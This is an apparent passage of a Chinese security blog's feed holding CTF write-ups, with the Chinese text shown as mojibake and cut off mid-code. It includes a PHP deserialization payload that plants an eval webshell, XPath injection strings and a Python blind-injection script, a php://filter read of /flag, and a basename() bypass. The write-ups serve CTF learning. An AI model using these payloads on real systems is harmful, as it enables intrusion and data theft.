/php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php/test/yakko | /php/index.php/test/yakko</span></span><br><span class="line"></span><br><span class="line">$_SERVER[â€˜REQUEST_URIâ€™]å®Œæ•´urlåœ°å€ï¼ŒåŒ…æ‹¬è¯·æ±‚çš„urlå‚æ•°</span><br><span class="line"></span><br><span class="line">$_SERVER[â€˜HTTP_HOSTâ€™]åªæœ‰ä¸€æ®µçš„åŸŸå,ä¸åŒ…æ‹¬å‰é¢çš„åè®®å’Œåé¢çš„ç›¸å¯¹ä½ç½®</span><br></pre></td></tr></table></figure></div><p>è®¿é—® <code>/index.php/config.php</code>ï¼Œç»è¿‡ <code>basename()</code> ä¼ å…¥ <code>highlight_file()</code> çš„æ–‡ä»¶åå°±ä¼šå˜æˆ <code>config.php</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $url1 = <span class="string">"testpath/index.php"</span>;</span><br><span class="line">     <span class="comment">// è¿”å›index.php</span></span><br><span class="line">    </span><br><span class="line">    $url2 = <span class="string">"testpath/index.php"</span>.urldecode(<span class="string">'%D1%A7%CF'</span>); </span><br><span class="line">    <span class="comment">// è¿”å›index.phpå’Œä¹±ç </span></span><br><span class="line">    </span><br><span class="line">    $url3 = urldecode(<span class="string">'%D1%A7%CF%B0index.php+ '</span>);</span><br><span class="line">     <span class="comment">// è¿”å›flagï¼Œå‰é¢çš„éacsiiè¢«åˆ é™¤</span></span><br><span class="line">    </span><br><span class="line">    $url4 = urldecode(<span class="string">'index.php%D1%A7%CF%B0 '</span>); </span><br><span class="line">    <span class="comment">// è¿”å›flagå’Œåé¢çš„éascii</span></span><br><span class="line"><span class="keyword">echo</span> basename($url1) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> basename($url2) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> basename($url3) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> basename($url4) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>Payload1</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://xxx.com/index.php/config.php/ä»»æ„ä¸­æ–‡?source</span></span><br></pre></td></tr></table></figure></div><p>ä»¥åŠå¤§ä½¬çš„fuzzæ€è·¯</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/config\.php\/*$/i'</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    $str=<span class="string">"/index.php/config.php/"</span>.chr($i);</span><br><span class="line">    <span class="keyword">if</span>(!check($str))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $i.<span class="string">"ï¼š"</span>.basename($str);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>Payload2</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://xxx.com/index.php/config.php/%80?source</span></span><br></pre></td></tr></table></figure></div><p>å‚è€ƒå¾ˆå¤šå¤§ä½¬çš„æ€è·¯<br><a href="https://blog.csdn.net/qq_58784379/article/details/121742710" target="_blank" rel="noopener">sGanYu(Zer0pts2020)basenameå‡½æ•°æ¼æ´</a><br><a href="https://blog.csdn.net/rfrder/article/details/110929280" target="_blank" rel="noopener">bfengj(Zer0pts2020)Can you guess it?çš„WP</a></p><hr><h1 id="å¨é€¼å‡ å¥"><a href="#å¨é€¼å‡ å¥" class="headerlink" title="å¨é€¼å‡ å¥"></a>å¨é€¼å‡ å¥</h1><p>å¾ˆä¹…æ²¡åšé¢˜äº†ï¼Œæ‘¸äº†å¤ªä¹…äº†ï¼Œçš„ç¡®è‡ªå·±ç”Ÿç–äº†å¾ˆå¤šï¼Œ2021å¹´ç¡®å®å¾ˆå¤šäº‹æƒ…ä¸æ€ä¹ˆé¡ºï¼Œå¸Œæœ›æ–°çš„ä¸€å¹´èƒ½å¥½ä¸€äº›å§</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="writeup" scheme="https://manayakko.github.io/yakko117/tags/writeup/"/>
    
      <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Ha1cyonCTF2020-å…¬å¼€èµ›</title>
    <link href="https://manayakko.github.io/yakko117/2020/04/18/NPUCTF2020/"/>
    <id>https://manayakko.github.io/yakko117/2020/04/18/NPUCTF2020/</id>
    <published>2020-04-18T00:59:02.917Z</published>
    <updated>2020-05-04T02:45:52.618Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>å¤ç°å­¦ä¹ ï¼Œè¿˜æ˜¯å­¦ä¹ åˆ°å¾ˆå¤šä¸œè¥¿çš„</p><h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020] ReadlezPHP"></a>[NPUCTF2020] ReadlezPHP</h1><p>F12 æºç çœ‹åˆ° <code>/time.php?source</code><br>ç®€å•çš„é“¾å­ï¼Œåºåˆ—åŒ–å¯¹è±¡ <code>assert</code> ä¼ é©¬</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$h = <span class="keyword">new</span> HelloPhp;</span><br><span class="line">$h-&gt;a = <span class="string">'file_put_contents("yakko.php", "&lt;?php eval(\$_REQUEST[\'cmd\']); ?&gt;")'</span>;</span><br><span class="line">$h-&gt;b = <span class="string">"assert"</span>;</span><br><span class="line"><span class="comment">//eval($h-&gt;a);</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($h));</span><br><span class="line">@$ppp = unserialize(serialize($h));</span><br></pre></td></tr></table></figure></div><p>Payload:<br><code>time.php?O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A67%3A%22file_put_contents%28%22yakko.php%22%2C+%22%3C%3Fphp+eval%28%5C%24_REQUEST%5B%27cmd%27%5D%29%3B+%3F%3E%22%29%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</code></p><p>ç„¶åèšå‰‘ ç»•è¿‡ <code>disable_fuction</code>, Payload <code>echo $FLAG</code></p><hr><h1 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020] ezlogin"></a>[NPUCTF2020] ezlogin</h1><p><a href="https://www.cnblogs.com/W4nder/p/12747742.html" target="_blank" rel="noopener">https://www.cnblogs.com/W4nder/p/12747742.html</a><br><a href="https://shimo.im/docs/6hyIjGkLoRc43JRs/read" target="_blank" rel="noopener">https://shimo.im/docs/6hyIjGkLoRc43JRs/read</a></p><p>ç™»é™†é¡µé¢å¦‚ä¸‹<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ha1cyon_login_1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ha1cyon_login_1.png" class="lazyload"></a></p><p>æŸ¥çœ‹æºç ï¼Œåœ¨ <code>static/main.js</code> å‘ç°å…³é”®ç‚¹</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> username = $(<span class="string">"#username"</span>).val();</span><br><span class="line">  <span class="keyword">var</span> password = $(<span class="string">"#password"</span>).val();</span><br><span class="line">  <span class="keyword">var</span> token = $(<span class="string">"#token"</span>).val();</span><br><span class="line">  <span class="keyword">if</span>(username == <span class="string">""</span> || password == <span class="string">""</span>)&#123;</span><br><span class="line">    $(<span class="string">".msg"</span>).text(<span class="string">"ç”¨æˆ·åå’Œå¯†ç ä¸èƒ½ä¸ºç©º!"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> data = <span class="string">"&lt;username&gt;"</span>+username+<span class="string">"&lt;/username&gt;"</span>+<span class="string">"&lt;password&gt;"</span>+password+<span class="string">"&lt;/password&gt;"</span>+<span class="string">"&lt;token&gt;"</span>+token+<span class="string">"&lt;/token&gt;"</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">"login.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/xml"</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        anysc: <span class="keyword">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> <span class="params">(result, status, xhr)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">if</span>(result == <span class="string">'æˆåŠŸ'</span>)&#123;</span><br><span class="line">            window.location.href = <span class="string">'admin.php'</span>;  </span><br><span class="line">          &#125;</span><br><span class="line">          $(<span class="string">".msg"</span>).text(result);</span><br><span class="line">          </span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> <span class="params">(XMLHttpRequest,textStatus,errorThrown)</span> </span>&#123;</span><br><span class="line">            $(<span class="string">".msg"</span>).text(errorThrown + <span class="string">':'</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>çœ‹åˆ°ç†Ÿæ‚‰çš„xmlï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯XXEï¼Œï¼ˆç„¶åç«™è¢«æ—¥äº† = =<br>åæ¥å¤ç°çš„æ—¶å€™ï¼ŒçŸ¥é“æ˜¯ <a href="https://www.cnblogs.com/backlion/p/8554749.html" target="_blank" rel="noopener">Xpathæ³¨å…¥</a></p><h2 id="æ³¨å…¥ä¸ç»•è¿‡"><a href="#æ³¨å…¥ä¸ç»•è¿‡" class="headerlink" title="æ³¨å…¥ä¸ç»•è¿‡"></a>æ³¨å…¥ä¸ç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$query = "/root/accounts/user[username/text()='".$name."' and password/text()='".$pwd."']";</span><br><span class="line"></span><br><span class="line">1.ä¸‡èƒ½å¯†ç ï¼Œè¿™ç‚¹å’ŒSQLå¾ˆåƒï¼›åœ¨çŸ¥é“ç”¨æˆ·åçš„æƒ…å†µï¼š</span><br><span class="line">?name=admin' or '1'='1&amp;pwd=fake</span><br><span class="line"></span><br><span class="line">åœ¨ä¸çŸ¥é“ç”¨æˆ·åçš„æƒ…å†µï¼Œä½¿ç”¨ä¸¤ä¸ªorç»•è¿‡ï¼š</span><br><span class="line">?name=fake' or '1'or'1&amp;pwd=fake</span><br><span class="line"></span><br><span class="line">2.ä½¿ç”¨|æ“ä½œç¬¦ï¼Œ</span><br><span class="line">?name=1']|/<span class="comment">/*|ss['&amp;pwd=fake</span></span><br></pre></td></tr></table></figure></div><p>å…¶æ‰§è¡Œçš„è¯­å¥ä¸ºï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/accounts/user[username/text()='1' ]|/<span class="comment">/*|ss['' and password/text()='1']</span></span><br></pre></td></tr></table></figure></div><p>å³å…ˆé—­åˆå‰é¢çš„è¯­å¥ï¼Œä¹‹ååˆ—å‡ºæ–‡æ¡£æ‰€æœ‰å…ƒç´ </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.ç›²æ³¨ï¼Œéœ€è¦ä¸€çº§ä¸€çº§çŒœè§£èŠ‚ç‚¹ï¼›çŒœè§£ç¬¬ä¸€çº§èŠ‚ç‚¹ï¼š</span><br><span class="line">?name=1' or substring(name(<span class="comment">/*[position()=1]),1,1)='r' or '1'='1&amp;pwd=fake</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åæ˜¯æ³¨å…¥</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">çŒœè§£ç¬¬äºŒçº§èŠ‚ç‚¹æ•°é‡ï¼š</span><br><span class="line">?name=1' or count(/root<span class="comment">/*)=2 or '1'='1&amp;fake</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">çŒœè§£ç¬¬äºŒçº§èŠ‚ç‚¹ï¼š</span></span><br><span class="line"><span class="comment">?name=1' or substring(name(/root/*[position()=1]),1,1)='u' or '1'='1&amp;pwd=fake</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">çŒœè§£idä¸º1çš„userèŠ‚ç‚¹ä¸‹çš„usernameå€¼ï¼š</span></span><br><span class="line"><span class="comment">?name=1' or substring(/root/users/user[id=1]/username,1,1)='a' or '1'='1&amp;pwd=fake</span></span><br></pre></td></tr></table></figure></div><h2 id="å¤§ä½¬çš„exp"><a href="#å¤§ä½¬çš„exp" class="headerlink" title="å¤§ä½¬çš„exp"></a>å¤§ä½¬çš„exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://buuoj-test.cn/'</span></span><br><span class="line">sess=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">token</span><span class="params">()</span>:</span></span><br><span class="line">    req=sess.get(url)</span><br><span class="line">    tok=re.findall(<span class="string">'&lt;input type="hidden" id="token" value="(.*)" /&gt;'</span>,req.text)</span><br><span class="line">    <span class="keyword">return</span> tok[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    data=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;&#123;&#125;&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;</span></span><br><span class="line"><span class="string">'''</span>.format(username,password,token())</span><br><span class="line"></span><br><span class="line">    req=sess.post(url+<span class="string">'login.php'</span>,data=data,headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;)</span><br><span class="line">    print(req.text,req.status_code)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># root</span></span><br><span class="line">payload=<span class="string">"' or  substring(name(/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'root'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'accounts'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/accounts/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'user'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/accounts/user/*[position()=2]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line"><span class="comment"># id username password</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1' or substring(/root/accounts/user[id=2]/username,&#123;&#125;,1)='&#123;&#125;' or '1'='1"</span></span><br><span class="line"><span class="comment"># guest adm1n</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1' or substring(/root/accounts/user[id=2]/password,&#123;&#125;,1)='&#123;&#125;' or '1'='1"</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.digits+string.ascii_letters+<span class="string">'*'</span>:</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">'*'</span>:</span><br><span class="line">            print(<span class="string">'***************false'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp=payload.format(i,j)</span><br><span class="line"></span><br><span class="line">        req=login(tmp,<span class="string">'ad'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'éæ³•æ“ä½œ'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            ro+=j</span><br><span class="line">            print(ro)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div><hr><p>å¾—åˆ° <code>adm1n cf7414b5bdb2e65ee43083f4ddbc4d9f</code><br>md5è§£å¯† gtfly123</p><p>ç™»é™†æˆåŠŸåï¼Œçœ‹åˆ°URLä¸º <code>admin.php?file=welcome</code><br>æŸ¥çœ‹æºç ï¼Œçœ‹åˆ°æœ‰ <code>base64</code> åŠ å¯†åçš„ <code>flag is in /flag</code><br>è¯´æ˜è¿˜è€ƒæŸ¥æ–‡ä»¶åŒ…å«ï¼Œç”¨ä¼ªåè®®æ‰“ï¼Œæµ‹äº†ä¸€ä¸‹ï¼Œå¤§æ¦‚æœ‰å‡ ä¸ªè¿‡æ»¤ <code>php read base64</code><br>ä¹Ÿè¿˜æ˜¯ç®€å•ï¼Œå¤§å°å†™ç»•è¿‡</p><p><code>/admin.php?file=Php://filter/Read=convert.Base64-encode/resource=/flag</code></p><hr><p>åé¢çš„ä¸€äº›é¢˜ç›®å…ˆæ‘¸äº†ï¼Œæœ‰ç©ºå†æ¥çœ‹äº†</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="writeup" scheme="https://manayakko.github.io/yakko117/tags/writeup/"/>
    
      <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>æ— æ•°å­—å­—æ¯ç»•è¿‡ Bypass</title>
    <link href="https://manayakko.github.io/yakko117/2020/04/16/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E7%BB%95%E8%BF%87webshell/"/>
    <id>https://manayakko.github.io/yakko117/2020/04/16/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E7%BB%95%E8%BF%87webshell/</id>
    <published>2020-04-16T03:08:09.874Z</published>
    <updated>2020-04-16T03:08:01.477Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>å¾ˆä¹…ä»¥å‰åšè¿‡å®‰æ’çš„é¢˜ï¼Œæœ€è¿‘é‡åˆ°ä¸ªå·®ä¸å¤šï¼Œæ¥è®°å½•ä¸€ä¸‹å­¦ä¹ ç¬”è®°<br>åˆ©ç”¨æ€è·¯æå‡ºæ¥è‡ªPç¥<a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„ webshell</a></p><h1 id="æ¼æ´æ ¸å¿ƒ"><a href="#æ¼æ´æ ¸å¿ƒ" class="headerlink" title="æ¼æ´æ ¸å¿ƒ"></a>æ¼æ´æ ¸å¿ƒ</h1><ul><li>å¼‚æˆ–ç»•è¿‡ Bypass</li><li>å–åç»•è¿‡</li><li>ä¸ç”¨æ•°å­—æ„é€ å‡ºæ•°å­—( å¼±ç±»å‹ <code>true å€¼ä¸º 1</code> -&gt; <code>true + true == 2</code> )</li></ul><h1 id="å®‰æ’çš„é¢˜å‹å’Œå˜ç§"><a href="#å®‰æ’çš„é¢˜å‹å’Œå˜ç§" class="headerlink" title="å®‰æ’çš„é¢˜å‹å’Œå˜ç§"></a>å®‰æ’çš„é¢˜å‹å’Œå˜ç§</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span 